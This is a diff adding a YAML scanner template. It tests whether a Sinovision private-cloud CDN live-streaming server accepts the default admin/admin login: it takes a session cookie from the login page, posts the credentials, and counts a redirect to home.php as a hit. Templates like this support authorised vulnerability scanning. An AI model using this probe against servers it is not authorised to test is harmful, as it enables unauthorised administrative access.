@@ -1,0 +1,29 @@
+id: poc-yaml-sinovision-cloud-cdn-live-default-passwd
+info:
+  name: 华视私云-CDN直播加速服务器默认弱口令漏洞
+  severity: medium
+  tags:
+  - 弱口令
+  finger: ''
+variables:
+  username: admin
+  password: admin
+firstRequest:
+  method: GET
+  path: /newlive/manager/login.php
+  expression: status_code == 200 && contains(headers, "PHPSESSID")
+  output:
+  - regex_match(headers, "PHPSESSID=(?P<cookie>.*?);")
+requests:
+- method: POST
+  path: /newlive/manager/login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID={{.cookie}}
+  data: Name={{.username}}&Pass={{.password}}
+  expression: 'status_code == 200 &&
+
+    contains(headers, "home.php")
+
+    '
+transport: http
